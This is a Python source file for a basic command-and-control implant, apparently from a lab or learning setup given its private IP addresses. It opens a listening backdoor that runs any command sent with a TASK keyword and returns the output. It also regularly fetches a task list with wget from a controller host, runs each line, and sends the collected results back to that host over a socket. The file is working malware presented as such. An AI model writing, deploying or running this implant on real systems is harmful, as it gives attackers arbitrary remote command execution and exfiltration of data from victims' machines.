import socket
from threading import Thread
import time
import os.path
import capabilities

def check_tasking(HOST,PORT):
    task_file_command = f"wget http://{HOST}:{PORT}/tasks.txt -O ./tasks-grabbed.txt"
    capabilities.run(task_file_command)

def comms_thread():
    COMMS = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    COMMS.bind(('10.0.0.45',54321))
    COMMS.listen()
    while True:
        COMX,COMX_ADDR = COMMS.accept()
        task = COMX.recv(1024)
        print(f"Received C2: {task.decode()}")
        if "TASK" in task.decode().upper():
            COMX.send(b"Enter your command: ")
            run_me = COMX.recv(1024)
            output = capabilities.run(run_me.decode())
            send_str = f"The result of `{run_me.decode().strip()}` is {output}" 
            COMX.send(send_str.encode())
        elif "KILL" in task.decode().upper():
            COMX.send(b"KILL RECV'D. KILLING NOW")
            import os
            os.kill(os.getpid(),9)    
        else:
            COMX.send((f"I'm not familiar with the task {task.decode().upper()}").encode())

        COMX.close()

def tasking_thread():
    MAX_TIMER = 120
    HOST = "10.0.0.60"
    PORT = 12345

    while True:

        sleep_timer = MAX_TIMER

#------------- Check for Tasking -------------#
        check_tasking(HOST,'9090')

#------------- Execute Tasking -------------#
        tasking_fh = open("./tasks-grabbed.txt",'r')
        for line in tasking_fh.readlines():
            if os.path.exists("results.txt"):
                fh_out = open("results.txt",'a')
            else:
                fh_out = open("results.txt",'w')
            fh_out.write(f"---------- {line.strip()} ----------\n")
            output = capabilities.run(line.strip())
            fh_out.write(output)
            fh_out.close()

#------------- Report Results -------------#
        CLIENT = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        CLIENT.connect((HOST,PORT))

        fh = open("results.txt",'r')
        for line in fh.readlines():
            CLIENT.send(line.encode())
        fh.close()
        CLIENT.close()
        print(f"Checking for tasks in {MAX_TIMER//60} minutes...")
        while sleep_timer > 0:
            sleep_timer-=1
            time.sleep(1)